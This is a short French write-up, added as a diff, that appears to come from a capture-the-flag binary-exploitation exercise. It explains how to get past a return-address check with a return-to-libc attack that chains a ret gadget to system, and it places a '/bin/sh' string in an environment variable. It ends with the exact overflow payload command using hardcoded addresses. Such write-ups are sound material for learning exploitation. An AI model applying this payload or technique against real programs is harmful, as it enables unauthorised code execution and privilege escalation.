@@ -1,0 +1,14 @@
+Pour celui ci, on peut tenter la meme technique (return to libc)
+Sauf que il y a une petite protection qui verifie que l'eip (plus precisement que le byte a l'index 84) est different de 0xbXXXXXXX
+Impossible d'appeler system directement, ou n'importe quelle fonction de la libc donc
+Cependant, il est possible de mettre l'eip sur une autre partie du programme
+On tente de mettre l'eip du retour de la fonction p, 0x0804853e, puis de call system a partir d'ici
+
+Notre payload ressemble donc a ca:
+BUFFER + ADRESSE DE RET + ADRESSE SYSTEM + 4 BYTES SANS IMPORTANCE + ADRESSE "/bin/sh"
+
+Pour plus de facilite on utilise cette commande pour avoir une tres grande string dans l'env:
+export COMMAND=$(python -c "print '/'*1024 + 'bin/sh'")
+
+Le payload ressemble donc a ca:
+python -c "print  'A'*80 + '\x3e\x85\x04\x08' + '\x60\xb0\xe6\xb7' + 'OSEF' + '\xb0\xfe\xff\xbf'" > /tmp/f
